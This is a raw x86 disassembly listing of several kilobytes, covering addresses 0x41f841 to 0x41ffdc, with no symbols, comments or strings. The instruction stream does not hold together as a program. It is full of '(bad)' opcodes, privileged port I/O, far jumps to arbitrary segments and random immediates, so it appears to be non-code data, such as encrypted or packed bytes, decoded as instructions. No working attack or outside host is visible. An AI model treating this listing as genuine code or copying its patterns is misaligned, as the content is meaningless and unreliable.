  41f841:	jo     0x41f7de
  41f843:	sti    
  41f844:	sub    BYTE PTR ds:0xb4dc1307,bh
  41f84a:	pop    es
  41f84b:	mov    ebp,0x42843306
  41f850:	bnd je 0x41f7ee
  41f853:	adc    DWORD PTR [eax-0x7],edx
  41f856:	cld    
  41f857:	inc    edx
  41f858:	inc    eax
  41f859:	adc    cl,BYTE PTR [ebp+0x5a]
  41f85c:	lds    ebp,FWORD PTR [eax+0x28]
  41f85f:	aas    
  41f860:	clc    
  41f861:	push   ss
  41f862:	lds    edi,FWORD PTR [esi+eiz*2]
  41f865:	fcom   DWORD PTR [ebx]
  41f867:	test   DWORD PTR [esi-0x2c],0xfc69bf91
  41f86e:	pop    ebp
  41f86f:	mov    esi,0xe199af4b
  41f874:	xor    al,0x93
  41f876:	in     eax,dx
  41f877:	sbb    bh,BYTE PTR [esi]
  41f879:	pop    ebp
  41f87a:	push   edi
  41f87b:	pushf  
  41f87c:	gs mov eax,0xa7f1d3a7
  41f882:	in     al,dx
  41f883:	in     al,0xd9
  41f885:	ins    BYTE PTR es:[edi],dx
  41f886:	lahf   
  41f887:	jbe    0x41f821
  41f889:	test   ecx,ebx
  41f88b:	int3   
  41f88c:	cwde   
  41f88d:	mov    ebx,0xbb3cc42f
  41f892:	mov    ch,BYTE PTR [edx+ebp*2]
  41f895:	call   0xff9dc707
  41f89a:	out    0xa0,eax
  41f89c:	cmp    eax,0x438b87ea
  41f8a1:	or     al,0xf6
  41f8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8a4:	inc    eax
  41f8a5:	in     eax,0xa5
  41f8a7:	in     eax,dx
  41f8a8:	add    al,0x88
  41f8aa:	sub    edx,ebp
  41f8ac:	push   cs
  41f8ad:	outs   dx,BYTE PTR ds:[esi]
  41f8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8af:	dec    ecx
  41f8b0:	daa    
  41f8b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8b2:	jno    0x41f88a
  41f8b4:	dec    ebp
  41f8b5:	and    al,0xe7
  41f8b7:	mov    eax,ds:0x8ca1b0f4
  41f8bc:	push   0x13
  41f8be:	lahf   
  41f8bf:	add    ebx,DWORD PTR [eax-0x2f]
  41f8c2:	cmp    cl,BYTE PTR [ebp-0x7]
  41f8c5:	bound  esp,QWORD PTR [edx+eiz*1]
  41f8c8:	ds xor dl,dh
  41f8cb:	sub    BYTE PTR [edi],al
  41f8cd:	imul   edi,DWORD PTR [edi],0x898a5164
  41f8d3:	mov    ebp,0xa5ba2aeb
  41f8d8:	jmp    0x1fd2:0x86af1a57
  41f8df:	stc    
  41f8e0:	push   es
  41f8e1:	mov    WORD PTR [ecx-0x1e],gs
  41f8e4:	pop    ss
  41f8e5:	outs   dx,BYTE PTR ds:[esi]
  41f8e6:	test   al,0x1c
  41f8e8:	push   eax
  41f8e9:	fs stc 
  41f8eb:	inc    eax
  41f8ec:	call   FWORD PTR [ebp+0x2af65d62]
  41f8f2:	ins    BYTE PTR es:[edi],dx
  41f8f3:	sbb    al,0x2
  41f8f5:	sbb    ah,BYTE PTR [ebx]
  41f8f7:	iret   
  41f8f8:	jmp    0xe19054be
  41f8fd:	clc    
  41f8fe:	adc    dh,bl
  41f900:	mov    cl,BYTE PTR fs:[ebp+0x7f33195b]
  41f907:	sbb    esp,ecx
  41f909:	xchg   esp,eax
  41f90a:	repnz sti 
  41f90c:	cli    
  41f90d:	jle    0x41f943
  41f90f:	xor    BYTE PTR [edi+ecx*4+0x3fbcc1cf],al
  41f916:	xchg   ebx,eax
  41f917:	bound  ebp,QWORD PTR [edx-0x2de9b0a6]
  41f91d:	inc    edx
  41f91e:	aaa    
  41f91f:	popf   
  41f920:	rcl    DWORD PTR [esi+esi*1+0x7f],0x72
  41f925:	test   al,0x5d
  41f927:	mov    ds:0x8c7d61f8,al
  41f92c:	mov    al,ds:0x8dbd35e1
  41f931:	out    dx,eax
  41f932:	push   ebp
  41f933:	xlat   BYTE PTR ds:[ebx]
  41f934:	test   al,0x37
  41f936:	ja     0x41f943
  41f938:	push   eax
  41f939:	dec    ebp
  41f93a:	fsubr  QWORD PTR [ebx+0x54]
  41f93d:	push   0x69162094
  41f942:	mov    esp,0x271f52d
  41f947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f948:	push   ebx
  41f949:	and    dl,bl
  41f94b:	sbb    DWORD PTR [ecx],edi
  41f94d:	shl    DWORD PTR fs:[edx+0x27],0x96
  41f952:	(bad)  
  41f953:	scas   eax,DWORD PTR es:[edi]
  41f954:	dec    esp
  41f955:	mov    ecx,0xceeaa9d6
  41f95a:	mov    dl,0x33
  41f95c:	mov    bh,0x1f
  41f95e:	(bad)  
  41f95f:	out    dx,al
  41f960:	xchg   ecx,eax
  41f961:	mov    ebp,0x47646e42
  41f966:	push   ds
  41f967:	push   ss
  41f968:	sbb    al,0x83
  41f96a:	pushf  
  41f96b:	jmp    FWORD PTR [edi+0x7f]
  41f96e:	mov    eax,0xa0f687cc
  41f973:	jno    0x41f958
  41f975:	push   0xbe20186b
  41f97a:	out    0xde,al
  41f97c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f97d:	push   ds
  41f97e:	pop    edi
  41f97f:	add    DWORD PTR [ebp+0x1c541c1c],ebx
  41f985:	(bad)  
  41f986:	neg    DWORD PTR [edx+0x2d]
  41f989:	fucompp 
  41f98b:	inc    esp
  41f98c:	pop    edx
  41f98d:	out    0x3,eax
  41f98f:	cdq    
  41f990:	pusha  
  41f991:	dec    edi
  41f992:	sub    al,0x9d
  41f994:	jbe    0x41f9ad
  41f996:	fdiv   DWORD PTR [edx-0x25f4fff2]
  41f99c:	(bad)  
  41f99d:	xchg   ecx,eax
  41f99e:	xchg   edi,eax
  41f99f:	xchg   esi,eax
  41f9a0:	shr    edi,cl
  41f9a2:	cmc    
  41f9a3:	loopne 0x41f992
  41f9a5:	push   ss
  41f9a6:	int3   
  41f9a7:	inc    esp
  41f9a8:	in     al,0x6e
  41f9aa:	fstp   DWORD PTR [edi-0x4a38032d]
  41f9b0:	dec    esi
  41f9b1:	jo     0x41fa1f
  41f9b3:	mov    esi,0xa66dd6c4
  41f9b8:	rcl    DWORD PTR [edi-0x26ee67d],0xf2
  41f9bf:	push   esp
  41f9c0:	loop   0x41f9cd
  41f9c2:	jecxz  0x41f9db
  41f9c4:	pop    ss
  41f9c5:	jmp    0xcc75:0x50fc3711
  41f9cc:	push   ecx
  41f9cd:	jg     0x41fa11
  41f9cf:	dec    eax
  41f9d0:	adc    al,0xa7
  41f9d2:	xchg   ecx,eax
  41f9d3:	sar    DWORD PTR [edx-0x11],0x2
  41f9d7:	xor    al,0x0
  41f9d9:	sub    eax,0xacfd0edd
  41f9de:	in     al,0xd6
  41f9e0:	mov    al,ds:0xd3d57a09
  41f9e5:	mov    ah,0x54
  41f9e7:	sbb    esp,esp
  41f9e9:	mov    esp,0xf7c33cec
  41f9ee:	ins    BYTE PTR es:[edi],dx
  41f9ef:	loop   0x41fa02
  41f9f1:	aad    0xe7
  41f9f3:	pop    ebp
  41f9f4:	jle    0x41fa19
  41f9f6:	in     eax,0xe6
  41f9f8:	jge    0x41fa35
  41f9fa:	fwait
  41f9fb:	idiv   BYTE PTR ds:0xc8c40b33
  41fa01:	jae    0x41fa3a
  41fa03:	rcr    BYTE PTR [eax],0x8f
  41fa06:	push   es
  41fa07:	xor    DWORD PTR [ebp+0x71],0xffffffda
  41fa0b:	jmp    0x41f9d1
  41fa0d:	out    0x8d,eax
  41fa0f:	cmp    eax,0x9bc360fa
  41fa14:	shl    BYTE PTR [eax+0x64],1
  41fa17:	scas   eax,DWORD PTR es:[edi]
  41fa18:	mov    bl,0x8c
  41fa1a:	retf   
  41fa1b:	iret   
  41fa1c:	mov    edx,0x6cf718a3
  41fa21:	je     0x41fa9d
  41fa23:	ss ret 
  41fa25:	push   ebp
  41fa26:	mov    ebx,0x38b41e52
  41fa2b:	sub    DWORD PTR [edi-0x3a6981bd],ebx
  41fa31:	xchg   edx,eax
  41fa32:	in     al,0x67
  41fa34:	mov    esp,0x6705a948
  41fa39:	ja     0x41fa0b
  41fa3b:	dec    eax
  41fa3c:	sahf   
  41fa3d:	cmp    eax,0x1abf6cb7
  41fa42:	sub    ah,BYTE PTR [ebx+0x54c8033a]
  41fa48:	into   
  41fa49:	push   es
  41fa4a:	jg     0x41fa03
  41fa4c:	call   DWORD PTR [ecx-0x6fd6345f]
  41fa52:	sbb    esp,0xffffffb5
  41fa55:	sub    cl,cl
  41fa57:	popa   
  41fa58:	sti    
  41fa59:	sub    al,0xe3
  41fa5b:	repnz icebp 
  41fa5d:	inc    edi
  41fa5e:	dec    ecx
  41fa5f:	rcr    ecx,0x50
  41fa62:	jns    0x41fa5a
  41fa64:	mov    DWORD PTR [eax+0x52],ecx
  41fa67:	repnz mov edx,0x5acaf882
  41fa6d:	call   0xd9867a3c
  41fa72:	(bad)  
  41fa73:	mov    ah,0x77
  41fa75:	add    DWORD PTR [ebx],0x2f
  41fa78:	xor    al,0xc5
  41fa7a:	call   FWORD PTR [edx-0x208bd12b]
  41fa80:	arpl   sp,dx
  41fa82:	cmp    ecx,DWORD PTR ds:0xf45b3dae
  41fa88:	adc    BYTE PTR [ebx],bh
  41fa8a:	push   ss
  41fa8b:	daa    
  41fa8c:	xor    bl,BYTE PTR [ebx]
  41fa8e:	ja     0x41faac
  41fa90:	adc    eax,0xc1f748ee
  41fa95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa96:	ins    BYTE PTR es:[edi],dx
  41fa97:	fiadd  WORD PTR [ecx-0x3e]
  41fa9a:	bound  edi,QWORD PTR [ecx-0x15]
  41fa9d:	push   es
  41fa9e:	(bad)  
  41fa9f:	sub    edx,DWORD PTR [edx+0x38]
  41faa2:	mov    ecx,0xb8bba5e2
  41faa7:	pop    eax
  41faa8:	pop    eax
  41faa9:	repz push ebx
  41faab:	aaa    
  41faac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faad:	hlt    
  41faae:	nop
  41faaf:	mov    al,0x3e
  41fab1:	rcl    DWORD PTR [esi-0x44],cl
  41fab4:	mov    ch,BYTE PTR [edi]
  41fab6:	push   0x57
  41fab8:	push   cs
  41fab9:	mov    ecx,0xac633f24
  41fabe:	mov    edi,DWORD PTR [ecx-0x3e731b92]
  41fac4:	pop    ebx
  41fac5:	mov    bh,0x8
  41fac7:	jns    0x41fab6
  41fac9:	mov    ds:0xa627f529,eax
  41face:	sub    bh,BYTE PTR [ebx]
  41fad0:	adc    al,0x38
  41fad2:	mov    fs,eax
  41fad4:	push   ebp
  41fad5:	and    al,0xb3
  41fad7:	out    0x4c,eax
  41fad9:	out    dx,al
  41fada:	jae    0x41faf1
  41fadc:	mov    es,WORD PTR [ebx-0x2b]
  41fadf:	xor    eax,DWORD PTR [ebx]
  41fae1:	pop    eax
  41fae2:	or     ebp,eax
  41fae4:	stos   BYTE PTR es:[edi],al
  41fae5:	xchg   ebp,eax
  41fae6:	call   0x1f6839e
  41faeb:	stos   DWORD PTR es:[edi],eax
  41faec:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41faee:	mov    esp,0x94db6dc0
  41faf3:	jbe    0x41fad6
  41faf5:	fsub   QWORD PTR [ebp+0x5aaf2c79]
  41fafb:	pusha  
  41fafc:	inc    ebx
  41fafd:	test   BYTE PTR [eax+0x26],ah
  41fb00:	sahf   
  41fb01:	neg    BYTE PTR [edi]
  41fb03:	repnz add BYTE PTR [ecx-0x6e4de2a5],0x1d
  41fb0b:	cmp    ecx,ebp
  41fb0d:	push   0x24
  41fb0f:	mov    ds:0xc58ec582,al
  41fb14:	(bad)  
  41fb15:	pop    esi
  41fb16:	les    ebp,FWORD PTR [ecx-0x7b]
  41fb19:	ror    BYTE PTR [ebx+0x1fff8709],0xf3
  41fb20:	mov    ds:0x6f808544,al
  41fb25:	push   ds
  41fb26:	cwde   
  41fb27:	cmp    ah,BYTE PTR [eax]
  41fb29:	sub    esi,esi
  41fb2b:	std    
  41fb2c:	xchg   DWORD PTR [esi+eax*4-0x78],edi
  41fb30:	out    0x3f,eax
  41fb32:	dec    esp
  41fb33:	mov    BYTE PTR [ebx-0x2faba3d1],0xb4
  41fb3a:	sub    al,0xa9
  41fb3c:	mov    al,0xc9
  41fb3e:	mov    ah,0x43
  41fb40:	aad    0x83
  41fb42:	test   DWORD PTR [edx+0x5d],edx
  41fb45:	in     al,0x55
  41fb47:	popf   
  41fb48:	fxch   st(0)
  41fb4a:	inc    edi
  41fb4b:	pop    esp
  41fb4c:	stos   DWORD PTR es:[edi],eax
  41fb4d:	scas   eax,DWORD PTR es:[edi]
  41fb4e:	pop    esi
  41fb4f:	fwait
  41fb50:	das    
  41fb51:	inc    edx
  41fb52:	ret    0x4b5c
  41fb55:	ss nop
  41fb57:	inc    ebx
  41fb58:	out    dx,eax
  41fb59:	popa   
  41fb5a:	fwait
  41fb5b:	in     eax,dx
  41fb5c:	sub    eax,DWORD PTR [esi-0x11b7a69b]
  41fb62:	sub    esp,ebx
  41fb64:	es sub al,0xd
  41fb67:	pop    es
  41fb68:	lock idiv DWORD PTR [esi+0x2f9fc734]
  41fb6f:	sub    eax,0xa7cac1c
  41fb74:	movq   mm6,QWORD PTR [ebx+ecx*1-0x57570332]
  41fb7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb7d:	xchg   edi,eax
  41fb7e:	aam    0xec
  41fb80:	icebp  
  41fb81:	lds    ebx,FWORD PTR [edi]
  41fb83:	pop    esi
  41fb84:	iret   
  41fb85:	jnp    0x41fb1e
  41fb87:	in     eax,dx
  41fb88:	sub    esp,DWORD PTR [edi]
  41fb8a:	aam    0x8c
  41fb8c:	nop
  41fb8d:	mov    ebx,0x1d805c70
  41fb92:	outs   dx,BYTE PTR ds:[esi]
  41fb93:	mov    ebx,DWORD PTR [eax+0x33]
  41fb96:	cmp    ch,BYTE PTR [edi+0x41]
  41fb99:	and    edx,DWORD PTR [edi-0xd]
  41fb9c:	dec    esp
  41fb9d:	push   cs
  41fb9e:	or     edx,DWORD PTR [esp+ebx*1-0x2719fb16]
  41fba5:	or     al,0x41
  41fba7:	sbb    al,0xb2
  41fba9:	dec    esp
  41fbaa:	add    BYTE PTR [ecx],dh
  41fbac:	mov    dl,0xf6
  41fbae:	stc    
  41fbaf:	pop    ebx
  41fbb0:	in     al,0xe8
  41fbb2:	and    al,0xbb
  41fbb4:	add    eax,0xc399a90
  41fbb9:	(bad)  
  41fbba:	fld    TBYTE PTR [ebp-0x1a755a76]
  41fbc0:	imul   ebx,DWORD PTR [ebp-0xa],0x2c
  41fbc4:	push   cs
  41fbc5:	jp     0x41fbfd
  41fbc7:	cmp    dl,BYTE PTR [edx-0x58]
  41fbca:	sahf   
  41fbcb:	pushf  
  41fbcc:	or     edi,edi
  41fbce:	xor    dl,cl
  41fbd0:	scas   al,BYTE PTR es:[edi]
  41fbd1:	xchg   edx,eax
  41fbd2:	sbb    al,0x8d
  41fbd4:	push   ebx
  41fbd5:	sub    al,BYTE PTR [edi+eax*1+0x52]
  41fbd9:	add    DWORD PTR [eax-0x2b],0x3a981c08
  41fbe0:	jge    0x41fbdb
  41fbe2:	push   ss
  41fbe3:	xor    eax,0xde1e91f0
  41fbe8:	cld    
  41fbe9:	popf   
  41fbea:	daa    
  41fbeb:	push   0x10076548
  41fbf0:	pop    ebx
  41fbf1:	mov    esp,0x8e9ced0f
  41fbf6:	stos   BYTE PTR es:[edi],al
  41fbf7:	fs dec ebx
  41fbf9:	fcmovnu st,st(3)
  41fbfb:	push   esp
  41fbfc:	mov    WORD PTR [esp+ecx*8+0x4d7be37a],?
  41fc03:	push   esi
  41fc04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc05:	outs   dx,DWORD PTR ds:[esi]
  41fc06:	jae    0x41fc57
  41fc08:	lea    esi,[esp+ecx*8-0x4245df26]
  41fc0f:	inc    esp
  41fc10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc11:	jo     0x41fbaa
  41fc13:	dec    ecx
  41fc14:	out    dx,al
  41fc15:	inc    ebx
  41fc16:	adc    bh,BYTE PTR [ecx+0x5]
  41fc19:	cli    
  41fc1a:	dec    esi
  41fc1b:	adc    dh,ah
  41fc1d:	xor    DWORD PTR [esi+0x34b8c2a7],ebp
  41fc23:	mov    ah,0x22
  41fc25:	ror    BYTE PTR [edx+0xd],1
  41fc28:	cmp    BYTE PTR [edi],dl
  41fc2a:	pushf  
  41fc2b:	sti    
  41fc2c:	jno    0x41fc53
  41fc2e:	inc    ebp
  41fc2f:	nop
  41fc30:	test   al,0x55
  41fc32:	fistp  DWORD PTR [bp+0x4fc7]
  41fc37:	dec    eax
  41fc38:	jnp    0x41fc81
  41fc3a:	pop    edi
  41fc3b:	push   ecx
  41fc3c:	fs add eax,0xc17811df
  41fc42:	je     0x41fc4a
  41fc44:	test   BYTE PTR [esi],dl
  41fc46:	ins    DWORD PTR es:[edi],dx
  41fc47:	jbe    0x41fca1
  41fc49:	inc    ebx
  41fc4a:	js     0x41fbfe
  41fc4c:	(bad)  [eax-0x7a]
  41fc4f:	popa   
  41fc50:	fild   DWORD PTR [ecx]
  41fc52:	add    edi,edi
  41fc54:	enter  0x367,0x6f
  41fc58:	inc    ecx
  41fc59:	jns    0x41fc6b
  41fc5b:	jne    0x41fc8d
  41fc5d:	sub    BYTE PTR [edi+ecx*1-0x36],bl
  41fc61:	(bad)  
  41fc62:	xchg   ecx,eax
  41fc63:	sbb    eax,0x327df047
  41fc68:	inc    edx
  41fc69:	fadd   DWORD PTR [esi-0x78]
  41fc6c:	push   ebp
  41fc6d:	es aaa 
  41fc6f:	mov    ds:0x4459965c,eax
  41fc74:	call   0x8598:0x18cb1f62
  41fc7b:	and    cl,BYTE PTR [edx-0x51e0b488]
  41fc81:	call   0x846d:0x1c2d15c2
  41fc88:	scas   eax,DWORD PTR es:[edi]
  41fc89:	dec    esp
  41fc8a:	(bad)  
  41fc8b:	cmp    eax,0xdaa6ee11
  41fc90:	jae    0x41fcae
  41fc92:	mov    cl,0x94
  41fc94:	imul   edi,DWORD PTR [edi+0xe0],0x0
	...
  41fd13:	add    BYTE PTR [edi+0x5d7b4dd7],al
  41fd19:	sti    
  41fd1a:	mov    bh,0xff
  41fd1c:	ds aad 0x54
  41fd1f:	ret    0x472
  41fd22:	or     eax,0x1964c49
  41fd27:	add    BYTE PTR [ebx+0x7],ch
  41fd2a:	add    BYTE PTR [eax],al
  41fd2c:	fbstp  TBYTE PTR [ebp-0x7faa5d2c]
  41fd32:	cmova  edx,ebx
  41fd35:	inc    esi
  41fd36:	mov    cl,0x55
  41fd38:	cmp    DWORD PTR [eax],0xc70dcbfb
  41fd3e:	and    DWORD PTR [ebp+0x5beda911],ebx
  41fd44:	jecxz  0x41fd5f
  41fd46:	or     DWORD PTR [eax+ebx*1],ecx
  41fd49:	mov    esp,0x68183117
  41fd4e:	adc    eax,0xabd2a096
  41fd53:	sbb    dh,BYTE PTR [eax+ebp*8+0x7f]
  41fd57:	push   edx
  41fd58:	ret    0xe84
  41fd5b:	shl    DWORD PTR [ecx-0x67],0xe9
  41fd5f:	xor    al,0x28
  41fd61:	inc    ebx
  41fd62:	dec    esp
  41fd63:	mov    bh,0xc4
  41fd65:	xchg   BYTE PTR [ebp+0xf],bh
  41fd68:	mov    dl,0x9f
  41fd6a:	jb     0x41fd52
  41fd6c:	dec    eax
  41fd6d:	xchg   esi,eax
  41fd6e:	dec    eax
  41fd6f:	out    0x1f,al
  41fd71:	mov    cl,0x27
  41fd73:	sbb    cl,BYTE PTR [ecx+0x4ae8525f]
  41fd79:	jno    0x41fd41
  41fd7b:	inc    eax
  41fd7d:	int    0x5d
  41fd7f:	sar    DWORD PTR [edi-0x75],1
  41fd82:	xor    ch,bl
  41fd84:	jge    0x41fd40
  41fd86:	cmp    DWORD PTR [esi+0x3e],ecx
  41fd89:	jmp    0x41fd94
  41fd8b:	lea    ebp,[ebp+0x23]
  41fd8e:	aaa    
  41fd8f:	ret    0x879a
  41fd92:	fld    QWORD PTR [ebx]
  41fd94:	mov    bh,0xbe
  41fd96:	cmp    esi,DWORD PTR ds:0x77fc6bb0
  41fd9c:	bound  esi,QWORD PTR [edi]
  41fd9e:	loopne 0x41fdd2
  41fda0:	jae    0x41fd39
  41fda2:	in     al,dx
  41fda3:	xchg   ebx,eax
  41fda4:	mov    fs,WORD PTR [eax-0x6c]
  41fda7:	cdq    
  41fda8:	mov    ch,0xf7
  41fdaa:	sti    
  41fdab:	outs   dx,BYTE PTR ds:[esi]
  41fdac:	jo     0x41fda8
  41fdae:	imul   edi,DWORD PTR [esi+0xb],0xffffffb7
  41fdb2:	in     al,dx
  41fdb3:	push   cs
  41fdb4:	adc    DWORD PTR [ecx+eiz*2+0xbd60d83],ebx
  41fdbb:	dec    ecx
  41fdbc:	and    esp,ebp
  41fdbe:	dec    edx
  41fdbf:	add    BYTE PTR ds:0x665e67d0,dl
  41fdc5:	int    0xa3
  41fdc7:	iret   
  41fdc8:	ret    
  41fdc9:	(bad)  
  41fdca:	cli    
  41fdcb:	sub    ah,BYTE PTR [edi+0x31]
  41fdce:	stos   BYTE PTR es:[edi],al
  41fdcf:	or     edi,ebx
  41fdd1:	sti    
  41fdd2:	jmp    0x588:0x7b7f443e
  41fdd9:	push   ebx
  41fdda:	pop    ss
  41fddb:	(bad)  
  41fddc:	xor    cl,0x22
  41fddf:	mov    eax,0x2cc1b647
  41fde4:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fde6:	imul   esi,DWORD PTR [ebx],0xc0ae5976
  41fdec:	jo     0x41fe5d
  41fdee:	push   es
  41fdef:	out    dx,eax
  41fdf0:	sub    ebx,esp
  41fdf2:	shl    BYTE PTR [edi+0x54],0xc9
  41fdf6:	aas    
  41fdf7:	or     ah,ch
  41fdf9:	in     al,0x71
  41fdfb:	fnsave [esi+0x66]
  41fdfe:	jo     0x41fde7
  41fe00:	push   0x1a
  41fe02:	pop    esi
  41fe03:	jne    0x41fe80
  41fe05:	add    al,0x0
  41fe07:	popf   
  41fe08:	call   0x7c57b550
  41fe0d:	mov    ebx,0xdf29c97b
  41fe12:	test   DWORD PTR [eax],0x9c1c9be4
  41fe18:	sub    DWORD PTR [edi],eax
  41fe1a:	leave  
  41fe1b:	lods   eax,DWORD PTR ds:[esi]
  41fe1c:	outs   dx,BYTE PTR ds:[esi]
  41fe1d:	or     edx,ecx
  41fe1f:	js     0x41fe7e
  41fe21:	outs   dx,DWORD PTR ds:[esi]
  41fe22:	xchg   DWORD PTR [ebx+esi*4-0x544555cf],ebp
  41fe29:	clc    
  41fe2a:	call   0xefbd:0x44a3e84d
  41fe31:	or     dh,BYTE PTR [edi+0x46]
  41fe34:	jmp    0x41fe05
  41fe36:	ss loope 0x41feae
  41fe39:	jp     0x41fe44
  41fe3b:	(bad)  
  41fe3c:	mov    ebx,0x115d6f5a
  41fe41:	cmp    edx,DWORD PTR [edx-0x36b2856b]
  41fe47:	sahf   
  41fe48:	pop    ebp
  41fe49:	retf   0x5ab
  41fe4c:	mov    edx,0xd14765a4
  41fe51:	stc    
  41fe52:	(bad)  
  41fe53:	cld    
  41fe54:	test   BYTE PTR [esi-0x37],0xb8
  41fe58:	xchg   edi,eax
  41fe59:	cmp    eax,0xc760e1b9
  41fe5e:	xor    al,0xa
  41fe60:	retf   0x7f5a
  41fe63:	ret    0xcf5c
  41fe66:	fdivr  QWORD PTR [ebp+0xc]
  41fe69:	sbb    DWORD PTR [ecx+0x37],0xe9a30d10
  41fe70:	cmc    
  41fe71:	out    dx,al
  41fe72:	mov    eax,ds:0xa53c9eea
  41fe77:	push   cs
  41fe78:	mov    edx,0xfca4f9ce
  41fe7d:	push   ds
  41fe7e:	lea    ebx,[edx+0x5f169c97]
  41fe84:	mov    bh,ah
  41fe86:	lods   eax,DWORD PTR ds:[esi]
  41fe87:	push   0x1b9bd0e3
  41fe8c:	push   0x605d1d7
  41fe91:	fs dec ebx
  41fe93:	cld    
  41fe94:	and    ebp,DWORD PTR [ebx+0x54]
  41fe97:	and    BYTE PTR [ebx-0x35],al
  41fe9a:	mov    dl,0xb7
  41fe9c:	call   0xa5e5e843
  41fea1:	lds    ebx,FWORD PTR [ebx+eiz*4+0x68fc5f27]
  41fea8:	mov    ecx,0x12cfed00
  41fead:	xchg   ebx,eax
  41feae:	lods   eax,DWORD PTR ds:[esi]
  41feaf:	pushf  
  41feb0:	and    dl,BYTE PTR [edi-0x62]
  41feb3:	iret   
  41feb4:	inc    esi
  41feb5:	mov    BYTE PTR [esi+0x35],bh
  41feb8:	inc    esi
  41feb9:	pop    ds
  41feba:	cld    
  41febb:	es mov esi,0x41655629
  41fec1:	(bad)  
  41fec2:	jecxz  0x41fe60
  41fec4:	jmp    0xbcbd06e9
  41fec9:	sub    BYTE PTR [eax+0x4fd0fe45],ch
  41fecf:	icebp  
  41fed0:	daa    
  41fed1:	test   DWORD PTR [edx-0x7b7a4d86],0xe6ad8b7f
  41fedb:	iret   
  41fedc:	lahf   
  41fedd:	and    edi,0x55
  41fee0:	sub    dh,BYTE PTR [ecx]
  41fee2:	and    eax,0x9db8e8f9
  41fee7:	xor    ebp,DWORD PTR es:[ebp+0x4627e2d3]
  41feee:	jg     0x41fe8b
  41fef0:	test   eax,0x2c127b9a
  41fef5:	and    eax,DWORD PTR [eax*1-0x3325e7e8]
  41fefc:	stos   DWORD PTR es:[edi],eax
  41fefd:	pop    ss
  41fefe:	cmp    BYTE PTR [edi+eiz*8-0x13],bl
  41ff02:	sbb    cl,BYTE PTR [ecx+0x3c]
  41ff05:	sbb    BYTE PTR [ecx+0x6b031e1c],bh
  41ff0b:	iret   
  41ff0c:	(bad)  
  41ff0d:	aad    0x6a
  41ff0f:	cdq    
  41ff10:	cmp    ah,BYTE PTR [edi+edx*8]
  41ff13:	mov    edx,0xdfb0b181
  41ff18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff19:	imul   edi,DWORD PTR [edi],0xffffffee
  41ff1c:	push   0xa
  41ff1e:	pop    edx
  41ff1f:	cmp    eax,0x31a4db29
  41ff24:	mul    BYTE PTR [eax-0x7f1b1d3f]
  41ff2a:	stc    
  41ff2b:	dec    ebx
  41ff2c:	pop    ebx
  41ff2d:	int    0xf5
  41ff2f:	sbb    DWORD PTR [esi+eax*8+0x5d],ecx
  41ff33:	push   ebp
  41ff34:	sub    ebx,ebx
  41ff36:	sahf   
  41ff37:	fisubr WORD PTR [ecx]
  41ff39:	(bad)  
  41ff3a:	aad    0x54
  41ff3c:	ret    
  41ff3d:	(bad)  
  41ff3e:	lea    esp,[esi+0x1ba0e42e]
  41ff44:	add    ebx,edi
  41ff46:	add    ecx,DWORD PTR [edi-0x63]
  41ff49:	cmc    
  41ff4a:	iret   
  41ff4b:	and    dl,dh
  41ff4d:	popf   
  41ff4e:	xchg   ecx,eax
  41ff4f:	sub    al,0x12
  41ff51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff52:	or     eax,0xd83db252
  41ff57:	repnz dec edi
  41ff59:	cmp    ebp,ecx
  41ff5b:	imul   DWORD PTR [edx+0x19]
  41ff5e:	es cmp esi,esp
  41ff61:	push   edx
  41ff62:	pop    esi
  41ff63:	xchg   DWORD PTR [ebp-0x5c],edx
  41ff66:	xchg   esp,eax
  41ff67:	test   al,0x82
  41ff69:	stc    
  41ff6a:	jb     0x41ff57
  41ff6c:	inc    esi
  41ff6d:	and    eax,DWORD PTR [edx+0x19]
  41ff70:	clc    
  41ff71:	scas   eax,DWORD PTR es:[edi]
  41ff72:	enter  0x8f31,0xb6
  41ff76:	mov    edi,0x407a1911
  41ff7b:	inc    edi
  41ff7c:	inc    ecx
  41ff7d:	bnd gs jmp 0x41ffd1
  41ff81:	lds    edi,FWORD PTR [edx+edx*4-0x3e4a1f0e]
  41ff88:	xchg   ecx,eax
  41ff89:	pushf  
  41ff8a:	cmp    al,cl
  41ff8c:	fstp   st(3)
  41ff8e:	stos   DWORD PTR es:[edi],eax
  41ff8f:	sub    bl,BYTE PTR [esi]
  41ff91:	and    dh,BYTE PTR ds:0xcb86ce92
  41ff97:	xchg   DWORD PTR [ecx],ebx
  41ff99:	sahf   
  41ff9a:	xor    al,0x9f
  41ff9c:	mov    bh,0xca
  41ff9e:	popa   
  41ff9f:	and    bh,BYTE PTR [esi-0x44]
  41ffa2:	in     eax,0xc1
  41ffa4:	rol    DWORD PTR [ecx+0x33],0x14
  41ffa8:	xchg   ebp,eax
  41ffa9:	mov    bh,0x2a
  41ffab:	push   ebx
  41ffac:	fmul   QWORD PTR [edi+0x8]
  41ffaf:	sti    
  41ffb0:	shr    DWORD PTR [edi+0x47],1
  41ffb3:	sbb    DWORD PTR [esi-0x39],eax
  41ffb6:	mov    bl,0x23
  41ffb8:	sbb    al,ah
  41ffba:	sbb    eax,0xf20d7443
  41ffbf:	(bad)  
  41ffc0:	adc    BYTE PTR [edx+eax*1],ah
  41ffc3:	adc    al,0xce
  41ffc5:	jp     0x420025
  41ffc7:	mov    WORD PTR [edx],cs
  41ffc9:	pop    eax
  41ffca:	sahf   
  41ffcb:	mov    cl,BYTE PTR [edx-0x23]
  41ffce:	fwait
  41ffcf:	cmp    bl,BYTE PTR [edi-0x77]
  41ffd2:	jecxz  0x420030
  41ffd4:	js     0x420042
  41ffd6:	mov    edx,DWORD PTR [ecx+0x2cbbaff4]
  41ffdc:	mov    DWORD PTR [edx+0x5d],edi
